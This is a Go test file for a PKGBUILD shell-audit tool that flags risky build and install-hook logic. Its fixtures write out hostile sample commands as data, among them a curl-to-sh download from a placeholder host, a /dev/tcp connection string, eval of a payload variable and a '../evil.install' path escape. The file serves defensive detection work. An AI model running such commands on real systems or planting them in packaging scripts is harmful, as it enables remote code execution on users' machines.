package shellaudit

import (
	"archive/tar"
	"compress/gzip"
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestAuditDirFindsMVPPatterns(t *testing.T) {
	dir := t.TempDir()
	pkgbuild := `
pkgname=x
pkgver=1
pkgrel=1
install=x.install
prepare() {
  eval "$payload"
  bash -c "id"
  curl -fsSL https://example.invalid/i.sh | sh
  printf '%s' '/dev/tcp/example.invalid/443'
  npm install left-pad
  go install example.com/tool@latest
  blob='` + strings.Repeat("QUJD", 40) + `'
}
`
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(pkgbuild), 0o644); err != nil {
		t.Fatal(err)
	}
	install := `
post_install() {
  python -m pip install bad
  rustup component add rustfmt
}
`
	if err := os.WriteFile(filepath.Join(dir, "x.install"), []byte(install), 0o644); err != nil {
		t.Fatal(err)
	}
	report, err := AuditDir(dir)
	if err != nil {
		t.Fatalf("AuditDir error: %v", err)
	}
	wantRules := []string{
		"eval",
		"shell-c",
		"download-pipe-shell",
		"dev-tcp",
		"third-party-install",
		"embedded-base64",
	}
	for _, rule := range wantRules {
		if !hasRule(report, rule) {
			t.Fatalf("missing rule %s in %#v", rule, report.Findings)
		}
	}
	if !hasFindingFile(report, "x.install") {
		t.Fatalf("expected install hook findings, got %#v", report.Findings)
	}
	out := FormatReport(report)
	if !strings.Contains(out, "Shell logic warnings:") || !strings.Contains(out, "Review these shell snippets carefully") {
		t.Fatalf("unexpected formatted report: %q", out)
	}
}

func TestAuditDirNoWarningsForPlainPKGBUILD(t *testing.T) {
	dir := t.TempDir()
	pkgbuild := `
pkgname=x
pkgver=1
pkgrel=1
source=("https://example.com/x.tar.gz")
build() {
  make
}
package() {
  make DESTDIR="$pkgdir" install
}
`
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(pkgbuild), 0o644); err != nil {
		t.Fatal(err)
	}
	report, err := AuditDir(dir)
	if err != nil {
		t.Fatalf("AuditDir error: %v", err)
	}
	if report.HasWarnings() {
		t.Fatalf("expected no warnings, got %#v", report)
	}
}

func TestAuditDirReportsDynamicAndUnsafeInstallHooks(t *testing.T) {
	tests := map[string]string{
		"dynamic": "install=\"${pkgname}.install\"\n",
		"escape":  "install=../evil.install\n",
		"missing": "install=missing.install\n",
	}
	for name, assignment := range tests {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte("pkgname=x\n"+assignment), 0o644); err != nil {
				t.Fatal(err)
			}
			report, err := AuditDir(dir)
			if err != nil {
				t.Fatalf("AuditDir error: %v", err)
			}
			if len(report.Incomplete) == 0 {
				t.Fatalf("expected incomplete warning, got %#v", report)
			}
		})
	}
}

func TestAuditDirDetectsEnvWrappedShellC(t *testing.T) {
	dir := t.TempDir()
	pkgbuild := "pkgname=x\nprepare() { FOO=bar env -i FOO=bar /bin/bash -c 'id'; }\n"
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(pkgbuild), 0o644); err != nil {
		t.Fatal(err)
	}
	report, err := AuditDir(dir)
	if err != nil {
		t.Fatalf("AuditDir error: %v", err)
	}
	if !hasRule(report, "shell-c") {
		t.Fatalf("expected shell-c warning, got %#v", report.Findings)
	}
}

func TestAuditDirAuditsPackageLocalShellScripts(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte("pkgname=x\npkgver=1\npkgrel=1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(dir, "scripts"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "scripts", "helper.sh"), []byte("#!/bin/sh\neval \"$payload\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	report, err := AuditDir(dir)
	if err != nil {
		t.Fatalf("AuditDir error: %v", err)
	}
	if !hasFindingFile(report, filepath.Join("scripts", "helper.sh")) || !hasRule(report, "eval") {
		t.Fatalf("expected helper.sh eval finding, got %#v", report.Findings)
	}
}

func TestAuditDirAuditsSourceListedShellScriptByShebang(t *testing.T) {
	dir := t.TempDir()
	pkgbuild := "pkgname=x\npkgver=1\npkgrel=1\nsource=('helper')\n"
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(pkgbuild), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "helper"), []byte("#!/usr/bin/env bash\nbash -c 'id'\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	report, err := AuditDir(dir)
	if err != nil {
		t.Fatalf("AuditDir error: %v", err)
	}
	if !hasFindingFile(report, "helper") || !hasRule(report, "shell-c") {
		t.Fatalf("expected source-listed helper finding, got %#v", report.Findings)
	}
}

func TestAuditDirUsesSRCINFOForDynamicSourceScript(t *testing.T) {
	dir := t.TempDir()
	pkgbuild := "pkgname=demo\npkgver=1\npkgrel=1\nsource=($pkgname.sh)\n"
	srcinfo := "pkgbase = demo\n\tsource = demo.sh\n\npkgname = demo\n"
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(pkgbuild), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, ".SRCINFO"), []byte(srcinfo), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "demo.sh"), []byte("#!/bin/sh\neval \"$payload\"\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	report, err := AuditDir(dir)
	if err != nil {
		t.Fatalf("AuditDir error: %v", err)
	}
	if !hasFindingFile(report, "demo.sh") || !hasRule(report, "eval") {
		t.Fatalf("expected .SRCINFO-resolved demo.sh finding, got %#v", report.Findings)
	}
}

func TestAuditDirReportsMissingSourceShellScript(t *testing.T) {
	dir := t.TempDir()
	pkgbuild := "pkgname=x\npkgver=1\npkgrel=1\nsource=('missing.sh')\n"
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte(pkgbuild), 0o644); err != nil {
		t.Fatal(err)
	}
	report, err := AuditDir(dir)
	if err != nil {
		t.Fatalf("AuditDir error: %v", err)
	}
	if len(report.Incomplete) == 0 || !strings.Contains(strings.Join(report.Incomplete, "\n"), "missing.sh") {
		t.Fatalf("expected missing source shell warning, got %#v", report.Incomplete)
	}
}

func TestAuditDirSkipsGeneratedAndVCSDirs(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "PKGBUILD"), []byte("pkgname=x\npkgver=1\npkgrel=1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, subdir := range []string{".git", "src", "pkg"} {
		if err := os.MkdirAll(filepath.Join(dir, subdir), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join(dir, subdir, "evil.sh"), []byte("eval \"$payload\"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	report, err := AuditDir(dir)
	if err != nil {
		t.Fatalf("AuditDir error: %v", err)
	}
	if hasRule(report, "eval") {
		t.Fatalf("expected generated and VCS scripts to be skipped, got %#v", report.Findings)
	}
}

func TestAuditDirBraveFixtureAuditsSourceScript(t *testing.T) {
	dir := extractFixture(t, "brave-origin-bin.tar.gz", "brave-origin-bin")
	report, err := AuditDir(dir)
	if err != nil {
		t.Fatalf("AuditDir error: %v", err)
	}
	if !hasReportFile(report, "brave-origin-bin.sh") {
		t.Fatalf("expected brave-origin-bin.sh to be audited, got %#v", report.Files)
	}
}

func hasRule(report Report, rule string) bool {
	for _, finding := range report.Findings {
		if finding.Rule == rule {
			return true
		}
	}
	return false
}

func hasReportFile(report Report, file string) bool {
	for _, reportFile := range report.Files {
		if reportFile.Path == file {
			return true
		}
	}
	return false
}

func extractFixture(t *testing.T, name, rootDir string) string {
	t.Helper()
	f, err := os.Open(filepath.Join("..", "..", "testdata", "fixtures", name))
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	gz, err := gzip.NewReader(f)
	if err != nil {
		t.Fatal(err)
	}
	defer gz.Close()
	tr := tar.NewReader(gz)
	dst := t.TempDir()
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			t.Fatal(err)
		}
		target := filepath.Clean(filepath.Join(dst, hdr.Name))
		rel, err := filepath.Rel(dst, target)
		if err != nil || strings.HasPrefix(rel, ".."+string(filepath.Separator)) || rel == ".." || filepath.IsAbs(rel) {
			t.Fatalf("unsafe fixture path: %s", hdr.Name)
		}
		switch hdr.Typeflag {
		case tar.TypeDir:
			if err := os.MkdirAll(target, 0o755); err != nil {
				t.Fatal(err)
			}
		case tar.TypeReg:
			if err := os.MkdirAll(filepath.Dir(target), 0o755); err != nil {
				t.Fatal(err)
			}
			out, err := os.OpenFile(target, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, os.FileMode(hdr.Mode).Perm())
			if err != nil {
				t.Fatal(err)
			}
			if _, err := io.Copy(out, tr); err != nil {
				out.Close()
				t.Fatal(err)
			}
			if err := out.Close(); err != nil {
				t.Fatal(err)
			}
		}
	}
	return filepath.Join(dst, rootDir)
}

func hasFindingFile(report Report, file string) bool {
	for _, finding := range report.Findings {
		if finding.File == file {
			return true
		}
	}
	return false
}
